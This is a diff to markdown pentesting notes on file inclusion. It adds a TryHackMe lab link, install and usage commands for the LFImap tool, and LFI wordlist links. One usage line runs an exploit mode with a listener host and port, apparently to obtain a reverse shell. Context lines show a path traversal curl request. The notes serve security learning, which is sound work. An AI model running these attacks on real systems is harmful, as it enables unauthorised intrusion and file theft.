@@ -4,6 +4,10 @@ description: Notes about some basic File Insclusion attack
 
 # File Inclusion
 
+### Playground
+
+* [**THM: File Inclusion, Path Traversal**](https://tryhackme.com/r/room/filepathtraversal)
+
 ### Dangerous Function Lead to File Inclusion
 
 | **Function**                 | **Read Content** | **Execute** | **Remote URL** |
@@ -105,12 +109,33 @@ curl http://target.com/index.php?view=../../../../../../../../../../../../../../
 ```
 {% endcode %}
 
+### Tools
+
+**LFImap**
+
+```bash
+# Install
+git clone https://github.com/hansmach1ne/LFImap
+cd LFImap/
+python3 -m venv lfimap_env
+source lfimap_env/bin/activate
+pip3 install -r requirements.txt
+
+# Usage
+Usage:
+python3 lfimap.py --help
+python3 lfimap.py -U "http://10.10.70.223/playground.php?page=test" -a
+python3 lfimap.py -U "http://10.10.70.223/playground.php?page=test" -x --lhost 10.9.245.106 --lport 443
+```
+
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh33OpuqB9v3evsJlqTqijUPEdY4TF0sKMWuXC1VhMBCh7OIKkk_OplXm29b0KOURlBvtN0Y2hsfCHcHciCxuvVZ0L1uK_3jS9v1Z4Xs5VFgkw2RbFs28oPYwlJOG3p-tAhNcDx8uT4-0v72jgAEMP1KCqs0PYtXVRpTV1P740O_x9XhIHMTPVkDrQoRtM/s1332/lfimap.png" alt=""><figcaption><p>LFImap</p></figcaption></figure>
+
 ### WordLists
 
 * https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
 * https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
 * https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
 
-References
+### References
 
 * [https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
